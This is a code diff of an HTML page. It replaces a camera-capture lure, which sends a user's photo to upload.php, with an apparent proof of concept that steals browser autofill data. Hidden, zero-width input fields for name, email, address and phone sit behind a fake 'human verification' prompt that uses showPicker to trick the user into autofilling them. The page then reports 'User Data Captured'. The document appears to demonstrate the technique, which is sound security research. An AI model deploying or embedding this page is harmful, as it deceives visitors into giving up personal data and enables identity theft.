@@ -1,62 +1,87 @@
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
-    h1 {
-        margin: 1em;
-    }
-
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-    }
-
     input {
-        display: none;
+        opacity: 0;
+        width: 0.1px;
+        border: none;
+        pointer-events: none;
     }
 
-    img {
-        width: 100%;
+    option {
+        all: initial;
+        background-color: black;
     }
+
+    select {
+        opacity: 0;
+        pointer-events: none;
+        position: absolute;
+        top: -10px;
+        left:225px;
+    }
+
 </style>
 
-<h1>Tap to share your camera to Apple</h1>
+<body>
+    <!-- Group 1 -->
+    <div class="input-group">
+        <div>
+            <span id="quest"></span><input id="autofill-data" name="name" autocomplete="name">
+        </div>
 
-<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
+        <input name="email" autocomplete="email">
+        <input name="address-line1" autocomplete="address-line1">
+        <input name="address-line2" autocomplete="address-line2">
+        <input name="city" autocomplete="address-level2">
+        <input name="state" autocomplete="address-level1">
+        <input name="country-name" autocomplete="country-name">
+        <input name="postal-code" autocomplete="postal-code">
+        <input name="tel" autocomplete="tel">
+    </div>
 
-<img id="img" src="">
-<a id="link" href="https://google.com" target="_blank">Tap to open camera</a>
+    <select id="selection">
+        <option>&emsp;&emsp;&emsp;&#128030;&emsp;&emsp;&emsp;</option>
+        <option>&emsp;&emsp;&emsp;&#128031;&emsp;&emsp;&emsp;</option>
+        <option>&emsp;&emsp;&emsp;&#128036;&emsp;&emsp;&emsp;</option>
+        <option>&emsp;&emsp;&emsp;&#128011;&emsp;&emsp;&emsp;</option>
+    </select>
+    <center>
+        <pre id="autofill-result"
+            style="background-color: aquamarine;font-size: 1.5rem;">The site requires human verification to proceed. Click to begin.</pre>
+    </center>
 
-<script>
-    document.getElementById('link').onclick = () => {
-        setTimeout(() => {
-            document.getElementById('fileSelect').click();
-        }, 600);
-    };
 
-    document.getElementById('fileSelect').onchange = (event) => {
-        const file = event.target.files[0];
-        if (file) {
-            const img = document.getElementById('img');
-            img.src = URL.createObjectURL(file);
-
-            const formData = new FormData();
-            formData.append('file', file);
-
-            fetch('upload.php', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(result => {
-                console.log('Success:', result);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+    <script>
+        const inputfill = document.getElementById('autofill-data');
+        const selectpicker = document.getElementById('selection');
+        function handleClick() {
+            document.getElementById('autofill-result').textContent = "Double-click the bug to verify";
+            document.getElementById('quest').textContent = "Double-click the bug to verify";
+            selectpicker.showPicker();
+            setTimeout(() => {
+                inputfill.showPicker();
+            }, 100);
+            document.removeEventListener('click', handleClick);
         }
-    };
-</script>
+
+        document.addEventListener('click', handleClick);
+
+
+        var inputFields = document.querySelectorAll('.input-group input');
+
+        inputFields.forEach(function (inputField) {
+            inputField.addEventListener('input', function () {
+
+                var formData = {};
+
+
+                inputFields.forEach(function (field) {
+                    formData[field.name] = field.value;
+                });
+
+
+                document.getElementById('autofill-result').textContent = JSON.stringify(formData, null, 2);
+                document.getElementById('quest').textContent = "User Data Captured";
+            });
+        });
+    </script>
+</body>
